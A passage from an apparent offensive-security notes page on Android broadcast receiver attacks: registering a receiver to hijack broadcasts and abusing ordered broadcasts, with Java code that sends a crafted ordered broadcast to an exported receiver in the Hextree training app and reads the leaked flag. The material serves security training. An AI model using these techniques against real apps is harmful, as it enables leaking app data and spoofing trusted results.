+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="fu">registerReceiver</span><span class="op">(</span>hijackReceiver<span class="op">,</span> <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span><span class="st">&quot;io.hextree.broadcast.FREE_FLAG&quot;</span><span class="op">),</span> <span class="bu">Context</span><span class="op">.</span><span class="fu">RECEIVER_EXPORTED</span><span class="op">);</span></span></code></pre></div>
+<h3 id="control-the-results">Control the results</h3>
+<p>Similar to activities, a broadcast can return results back to the sender with <code>sendOrderedBroadcast()</code>. This method takes another BroadcastReceiver (the <em>result receiver</em>), which is called at the end with the final result (<code>resultCode</code>, <code>resultData</code>, <code>resultExtras</code>).</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>BroadcastReceiver resultReceiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> resultData <span class="op">=</span> <span class="fu">getResultData</span><span class="op">();</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>        Bundle resultExtras <span class="op">=</span> <span class="fu">getResultExtras</span><span class="op">(</span><span class="kw">false</span><span class="op">);</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> resultCode <span class="op">=</span> <span class="fu">getResultCode</span><span class="op">();</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="fu">sendOrderedBroadcast</span><span class="op">(</span>intent<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> resultReceiver<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> RESULT_CANCELED<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span></code></pre></div>
+<p>This works in both directions:</p>
+<ul>
+<li><strong>The victim sends</strong> the ordered broadcast: a malicious receiver can set attacker-controlled results with <code>setResultCode()</code>, <code>setResultData()</code> and <code>setResultExtras()</code>, which the victim then trusts (see <a href="#intercept-implicit-intents">Intercept implicit intents</a>).</li>
+<li><strong>The attacker sends</strong> the ordered broadcast to the victim’s receiver: the victim’s results come back to the attacker’s result receiver, possibly leaking data (example below).</li>
+</ul>
+<p><strong>Example</strong></p>
+<p>Let’s say that the app io.hextree.attacksurface has the following BroadcastReceiver:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">receiver</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.receivers.Flag17Receiver&quot;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag17Receiver <span class="kw">extends</span> BroadcastReceiver <span class="op">{</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> FlagSecret <span class="op">=</span> <span class="st">&quot;give-flag-17&quot;</span><span class="op">;</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span> </span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag17Receiver.onReceive&quot;</span><span class="op">,</span> Utils<span class="op">.</span><span class="fu">dumpIntent</span><span class="op">(</span>context<span class="op">,</span> intent<span class="op">));</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span><span class="fu">isOrderedBroadcast</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">).</span><span class="fu">equals</span><span class="op">(</span>FlagSecret<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span>context<span class="op">,</span> FlagSecret<span class="op">);</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>            Bundle bundle <span class="op">=</span> <span class="kw">new</span> <span class="fu">Bundle</span><span class="op">();</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>            bundle<span class="op">.</span><span class="fu">putBoolean</span><span class="op">(</span><span class="st">&quot;success&quot;</span><span class="op">,</span> <span class="kw">false</span><span class="op">);</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>            <span class="fu">setResult</span><span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="st">&quot;Flag 17 Completed&quot;</span><span class="op">,</span> bundle<span class="op">);</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">void</span> <span class="fu">success</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> <span class="bu">String</span> str<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>        Flag17Activity flag17Activity <span class="op">=</span> <span class="kw">new</span> <span class="fu">Flag17Activity</span><span class="op">();</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>        flag17Activity<span class="op">.</span><span class="fu">f182f</span> <span class="op">=</span> <span class="kw">new</span> <span class="fu">LogHelper</span><span class="op">(</span>context<span class="op">);</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>        flag17Activity<span class="op">.</span><span class="fu">f182f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span>str<span class="op">);</span></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>        flag17Activity<span class="op">.</span><span class="fu">success</span><span class="op">(</span><span class="kw">null</span><span class="op">,</span> context<span class="op">);</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>        Bundle bundle <span class="op">=</span> <span class="kw">new</span> <span class="fu">Bundle</span><span class="op">();</span></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>        bundle<span class="op">.</span><span class="fu">putBoolean</span><span class="op">(</span><span class="st">&quot;success&quot;</span><span class="op">,</span> <span class="kw">true</span><span class="op">);</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>        bundle<span class="op">.</span><span class="fu">putString</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> flag17Activity<span class="op">.</span><span class="fu">f182f</span><span class="op">.</span><span class="fu">appendLog</span><span class="op">(</span>flag17Activity<span class="op">.</span><span class="fu">flag</span><span class="op">));</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>        <span class="fu">setResult</span><span class="op">(-</span><span class="dv">1</span><span class="op">,</span> <span class="st">&quot;Flag 17 Completed&quot;</span><span class="op">,</span> bundle<span class="op">);</span></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To get the flag, send an ordered broadcast to the receiver and read the results:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="st">&quot;give-flag-17&quot;</span><span class="op">);</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.receivers.Flag17Receiver&quot;</span><span class="op">);</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sendOrderedBroadcast</span><span class="op">(</span>intent<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>        Bundle result <span class="op">=</span> <span class="fu">getResultExtras</span><span class="op">(</span><span class="kw">true</span><span class="op">);</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>result <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> result<span class="op">.</span><span class="fu">getBoolean</span><span class="op">(</span><span class="st">&quot;success&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;Flag: &quot;</span><span class="op">,</span>result<span class="op">.</span><span class="fu">getString</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">));</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}}</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
